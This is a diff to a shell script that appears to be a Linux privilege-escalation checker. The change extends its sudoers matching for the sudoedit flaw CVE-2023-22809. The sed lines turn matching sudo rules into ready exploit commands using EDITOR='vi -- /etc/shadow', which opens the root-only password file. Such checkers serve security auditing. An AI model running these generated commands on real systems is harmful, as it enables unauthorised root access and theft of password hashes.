@@ -487,7 +487,7 @@ sudoeditrockchk=`cat cve.sudo2.txt | grep "$(echo $sver)" | grep "CVE-2023-22809
 if [ "$sudoeditrockchk" ]; then
   #sudoeditrock=$(echo "$cmd" 2>/dev/null | grep -i "(root) NOPASSWD: sudoedit /")
   #sudoeditrock=$(echo "$cmd" 2>/dev/null | grep -i "(root) NOPASSWD: sudoedit /" | sed -e "s/(root) NOPASSWD: /EDITOR='vi -- \/etc\/shadow' /g" )
-  sudoeditrock=$(echo "$cmd" 2>/dev/null | grep -i "(root) NOPASSWD: sudoedit /\|(ALL : ALL) NOPASSWD: sudoedit" | sed -e "s/(root) NOPASSWD: /EDITOR='vi -- \/etc\/shadow' /g" | sed -e "s/(ALL : ALL) NOPASSWD: /EDITOR='vi -- \/etc\/shadow' /g")
+  sudoeditrock=$(echo "$cmd" 2>/dev/null | grep -i "(root) NOPASSWD: sudoedit /\|(ALL : ALL) NOPASSWD: sudoedit\|(ALL) NOPASSWD: sudoedit" | sed -e "s/(root) NOPASSWD: /EDITOR='vi -- \/etc\/shadow' /g" | sed -e "s/(ALL : ALL) NOPASSWD: /EDITOR='vi -- \/etc\/shadow' /g"| sed -e "s/(ALL) NOPASSWD: /EDITOR='vi -- \/etc\/shadow' /g")
   if [ "$sudoeditrock" ]; then
    #sudo_escape=$(sudoedit -s / | grep "sudoedit:")
    #sudo_escape=$("sudoedit -s /")
@@ -505,7 +505,7 @@ if [ "$sudoeditrockchk" ]; then
    #fi    
   fi
   
-  sudoeditrocknp=$(echo "$cmd" 2>/dev/null | grep -i "(root) sudoedit /\|(ALL : ALL) sudoedit" | sed -e "s/(root) /EDITOR='vi -- \/etc\/shadow' /g" | sed -e "s/(ALL : ALL) /EDITOR='vi -- \/etc\/shadow' /g")
+  sudoeditrocknp=$(echo "$cmd" 2>/dev/null | grep -i "(root) sudoedit /\|(ALL : ALL) sudoedit\|(ALL) sudoedit" | sed -e "s/(root) /EDITOR='vi -- \/etc\/shadow' /g" | sed -e "s/(ALL : ALL) /EDITOR='vi -- \/etc\/shadow' /g"| sed -e "s/(ALL) /EDITOR='vi -- \/etc\/shadow' /g")
   if [ "$sudoeditrocknp" ]; then
     echo -e "${BOLD}${GREEN}[+] Checking for the vulnerability CVE-2023-22809${RESET}"
     echo -e "${BOLD}${RED}[-] Vulnerable to CVE-2023-22809${RESET}"
